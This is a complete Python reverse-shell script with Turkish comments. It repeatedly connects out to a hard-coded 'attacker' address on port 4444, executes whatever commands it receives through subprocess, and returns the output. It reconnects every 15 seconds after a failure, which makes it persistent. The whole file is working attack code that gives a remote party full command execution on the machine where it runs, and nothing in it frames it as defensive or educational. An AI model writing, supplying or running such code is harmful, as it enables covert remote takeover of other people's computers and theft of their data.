import socket
import subprocess
import time

# Bağlanılacak saldırganın IP adresi ve portu
attacker_ip = "192.168.1.100"  # Saldırganın IP adresini buraya yazın
attacker_port = 4444  # Saldırganın dinlediği portu buraya yazın

def connect():
  while True:
      try:
          # Bağlantı kurma
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((attacker_ip, attacker_port))
          return s
      except socket.error:
          # Bağlantı başarısız olursa 15 saniye bekle ve tekrar dene
          time.sleep(15)

def main():
  while True:
      s = connect()
      try:
          while True:
              # Saldırgandan komut al
              command = s.recv(1024).decode("utf-8")
              
              # Çıkış komutu alındığında döngüden çık
              if command.lower() == "exit":
                  break
              
              # Komutu çalıştır ve çıktıyı al
              output = subprocess.getoutput(command)
              
              # Çıktıyı saldırgana gönder
              s.send(output.encode("utf-8"))
      except socket.error:
          # Bağlantı koparsa tekrar bağlanmayı dene
          s.close()
          time.sleep(15)

if __name__ == "__main__":
  main()
